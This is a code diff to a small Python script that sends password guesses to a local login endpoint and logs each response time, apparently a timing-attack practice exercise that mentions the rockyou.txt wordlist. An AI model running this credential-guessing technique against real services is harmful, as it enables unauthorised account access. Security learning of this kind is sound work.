@@ -1,7 +1,7 @@
 import requests
 import time
 
-url = "http://127.0.0.1:5000/login"
+timingattack_url = "http://127.0.0.1:5000/timingAttack"
 
 # Guesses array: Normally this would be from a wordlist 
 ## If you didn't fiddle with your kali for pentesting, check out rockyou.txt at only if you have tar it first!
@@ -14,11 +14,11 @@ for guess in guesses:
 
 
     start = time.perf_counter()
-    r = requests.post(url=url,data=data)
+    r = requests.post(url=timingattack_url, data=data)
     end = time.perf_counter()
 
 
     elapsed_time = end - start
 
     with open("./knockknock_RESULTS2.txt","a") as file:
-        file.write(f"Current Guess: {guess}, Response Time:{elapsed_time}, Status:{r.text} \n")
+        file.write(f"Current Guess: {guess}, Response Time:{elapsed_time} \n")
